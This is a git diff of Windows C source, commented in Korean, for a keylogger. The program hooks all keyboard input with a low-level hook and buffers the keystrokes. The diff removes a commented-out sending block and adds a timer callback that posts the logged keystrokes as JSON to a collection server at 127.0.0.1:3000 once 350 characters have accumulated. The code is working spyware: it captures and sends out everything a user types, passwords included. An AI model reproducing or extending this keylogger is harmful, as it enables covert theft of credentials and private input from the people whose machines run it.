@@ -214,19 +214,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
             }
         }
 
-        //if (logBufferIndex >= BUFSIZE - 100) { // 버퍼가 가득 찼을 때
-        //    logBuffer[logBufferIndex] = '\0';
-
-        //    // JSON 데이터 생성
-        //    char json_data[BUFSIZE];
-        //    snprintf(json_data, BUFSIZE, "{\"logs\":\"%s\"}", logBuffer);
-
-        //    // 서버로 데이터 전송
-        //    send_post_request("127.0.0.1", 3000, "/get_logs", json_data);
-
-        //    // 버퍼 초기화
-        //    logBufferIndex = 0;
-        //}
     }
 
 
@@ -236,11 +223,30 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
     return 0;
 }
 
+// 타이머 호출될 때마다 실행되는 함수
+void CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime)
+{   
+    if (logBufferIndex >= 350)
+    {
+        // 데이터 전송 함수 호출
+        logBuffer[logBufferIndex] = '\0';
+        char json_data[BUFSIZE];
+        snprintf(json_data, BUFSIZE, "{\"logs\":\"%s\"}", logBuffer);
+        send_post_request("127.0.0.1", 3000, "/get_logs", json_data);
+
+        // 버퍼 초기화
+        logBufferIndex = 0;
+    }
+}
+
+
 int main(int argc, char* argv[])
 {
     HMODULE hInstance = GetModuleHandle(NULL);    //자신의 module값을 가져온다.
 
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);    //후킹 프로시저를 설치
+
+    UINT_PTR timerId = SetTimer(NULL, 0, 100, TimerProc); // .1초 (100밀리초)마다 타이머 호출
 
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0))    //메시지 큐에 메시지가 있으면 MSG구조체에 저장하고 TRUE 반환하며, WM_QUIT일 경우 FALSE를 반환한다.
